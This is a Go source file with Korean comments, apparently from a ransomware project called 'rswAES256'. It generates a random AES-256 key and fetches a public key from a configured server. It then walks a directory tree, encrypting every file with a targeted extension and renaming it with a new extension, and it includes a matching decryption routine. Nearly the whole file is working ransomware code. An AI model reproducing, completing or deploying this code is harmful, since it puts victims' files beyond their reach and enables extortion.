package client

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"rswAES256/decrypt"
	"rswAES256/encrypt"
	"strings"
)

// CreateRandomKey 는 32바이트 난수 키를 생성합니다.
func (c *Client) CreateRandomKey() []byte {
	key := make([]byte, 32)
	_, err := rand.Read(key)
	if err != nil {
		panic(err)
	}
	c.Key = fmt.Sprintf("%x", key)

	return key
}

// GetPublicKey 는 서버로부터 공개키를 가져온다.
func (c *Client) GetPublicKey() (*string, error) {
	res, err := http.Get(c.config.Network.Uri)
	if err != nil {
		log.Println(err)
		return nil, err
	}

	// body 닫기
	defer func(Body io.ReadCloser) {
		err = Body.Close()
		if err != nil {
			log.Println("Error closing response body:", err)
		}
	}(res.Body)

	// body 읽어옴
	body, err := io.ReadAll(res.Body)
	if err != nil {
		log.Println(err)
		return nil, err
	}

	// body에 있는 데이터를 client에 넣어줌.
	err = json.Unmarshal(body, &c)
	if err != nil {
		log.Println(err)
		return nil, err
	}

	return &c.PublicKey, nil
}

// AESEncryptDirectory 는 전달한 root 경로부터 하위 폴더까지 탐색하면서 파일을 암호화 합니다.
func (c *Client) AESEncryptDirectory(rootPath string) error {

	// filepath.Walk 함수에 디렉토리 경로와 콜백 함수를 전달합니다.
	err := filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			// 파일 또는 디렉토리에 접근하는 중 에러가 발생한 경우 처리
			fmt.Printf("error accessing %s: %v\n", path, err)
			return err
		} else {
			for _, extension := range c.config.Extensions.Targets {
				// 등록된 target 확장자인지 체크.
				if strings.HasSuffix(info.Name(), extension) {
					//fmt.Printf("Path: %s, IsDir: %v, Name: %v\n", path, info.IsDir(), info.Name())
					// 파일을 암호화
					keyToByte, _ := hex.DecodeString(c.Key)
					if err = encrypt.EncryptFile(path, keyToByte); err != nil {
						log.Printf("error encrypting %s: %v\n", path, err)
						return err
					} else { // 암호화 성공시 확장자 변경
						if err = c.ChangeFileExtension(path); err != nil {
							log.Printf("error changing %s: %v\n", path, err)
							return err
						}
						fmt.Println(path, "에 대해 암호화를 성공하였습니다.")
						fmt.Println(path, "에 대해 .", c.config.Extensions.NewExt, "로 확장자 변경을 성공하였습니다.")
						break
					}
				}
			}
		}
		return nil
	})

	// 순회 중 에러가 발생한 경우 출력합니다.
	if err != nil {
		log.Printf("error walking the path %q: %v\n", rootPath, err)
		return err
	}
	return nil
}

// AESDecryptDirectory 는 전달한 root 경로부터 하위 폴더까지 탐색하면서 파일을 복호화 합니다.
func (c *Client) AESDecryptDirectory(rootPath string) error {
	// filepath.Walk 함수에 디렉토리 경로와 콜백 함수를 전달합니다.
	err := filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			// 파일 또는 디렉토리에 접근하는 중 에러가 발생한 경우 처리
			fmt.Printf("error accessing %s: %v\n", path, err)
			return err
		} else {
			// NewExt 확장자인데 체크.
			if strings.HasSuffix(info.Name(), c.config.Extensions.NewExt) {
				//fmt.Printf("Path: %s, IsDir: %v, Name: %v\n", path, info.IsDir(), info.Name())

				// 파일 확장자 복호화
				if newPath, err := c.RestoreOriginalExtension(path); err != nil {
					log.Printf("error restoring to original extension %s: %v\n", path, err)
					return err
				} else {
					//파일내용을 복호화
					keyToByte, _ := hex.DecodeString(c.Key)
					if err = decrypt.DecryptFile(*newPath, keyToByte); err != nil {
						log.Printf("error decrypting %s: %v\n", path, err)
						return err
					}
					fmt.Println(path, "에 대해 확장자 복구를 성공하였습니다.")
					fmt.Println(*newPath, "에 대해 복호화를 성공하였습니다.")
				}
			}
		}
		return nil
	})

	// 순회 중 에러가 발생한 경우 출력합니다.
	if err != nil {
		log.Printf("error walking the path %q: %v\n", rootPath, err)
		return err
	}
	return nil
}

// ChangeFileExtension 는 파일 확장자를 변경합니다.
func (c *Client) ChangeFileExtension(filePath string) error {
	// 디렉토리 경로 분리
	dir := filepath.Dir(filePath)
	// 파일 이름 분리
	fileName := filepath.Base(filePath)

	// "." 체크
	if !strings.HasPrefix(c.config.Extensions.NewExt, ".") {
		fileName += "."
	}
	// 파일 이름에 새로운 확장자 추가
	fileName += c.config.Extensions.NewExt

	// 새로운 전체 경로 생성.
	newPath := filepath.Join(dir, fileName)

	// 새로운 확장자로 파일 이름을 변경.
	err := os.Rename(filePath, newPath)
	if err != nil {
		return fmt.Errorf("파일 이름 변경 실패: %v", err)
	}

	return nil
}

// RestoreOriginalExtension 는 원래 확장자로 복구합니다.(ex. test.go.jkd => test.go)
func (c *Client) RestoreOriginalExtension(filePath string) (*string, error) {
	var newFileName string
	// 디렉토리 경로 분리
	dir := filepath.Dir(filePath)
	// 파일 이름 분리
	fileName := filepath.Base(filePath)

	// 확장자 체크
	if ext := filepath.Ext(fileName); ext == "" {
		return nil, fmt.Errorf("파일에 확장자가 없습니다: %s", fileName)
	} else if !strings.HasSuffix(fileName, c.config.Extensions.NewExt) { // NewExt 확장자인지 체크
		fmt.Println("filename:", fileName)
		fmt.Println("extension:", c.config.Extensions.NewExt)
		return nil, fmt.Errorf(c.config.Extensions.NewExt, "확장자가 아닙니다.")
	} else {
		// 확장자 제거 = ex)test.go.jkd => test.go
		newFileName = strings.TrimSuffix(fileName, c.config.Extensions.NewExt)
	}

	// 새로운 전체 경로 생성.
	newPath := filepath.Join(dir, newFileName)

	// 새로운 확장자로 파일 이름을 변경.
	err := os.Rename(filePath, newPath)
	if err != nil {
		return nil, fmt.Errorf("파일 이름 변경 실패: %v", err)
	}

	return &newPath, nil
}
